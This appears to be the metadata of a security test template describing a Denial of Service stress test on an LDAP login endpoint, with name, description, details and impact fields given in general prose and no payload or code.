  name: "Denial of Service on  LDAP Login endpoint stress test"
  description: "In a Denial of Service (DoS) stress test on a LDAP login endpoint, the endpoint is provided with a special input that causes the endpoint to lag. This aims to evaluate the endpoint's resilience under heavy load and assess its ability to authenticate users efficiently. By simulating such attacks, testers identify potential weaknesses in the LDAP login mechanism, enabling proactive measures to bolster the system's defenses against DoS attacks targeting authentication services."
  details: "In this Denial of Service (DoS) stress test on an LDAP login endpoint, testers intentionally provide the endpoint with a specially crafted input designed to induce lag. This evaluates the endpoint's performance under heavy load and its capacity to efficiently authenticate users despite disruptions. By simulating these attacks, vulnerabilities in the LDAP login mechanism are uncovered, empowering proactive measures to strengthen the system's defenses against DoS attacks targeting authentication services."
  impact: "The impact of a successful Denial of Service (DoS) stress test on a LDAP login endpoint can be significant. Introducing lag-inducing inputs may cause delays in user authentication, leading to decreased system responsiveness and potential service interruptions. Additionally, prolonged login times or failures can frustrate users, erode trust in the system, and result in reputational damage for the organization, emphasizing the importance of fortifying defenses against such attacks."
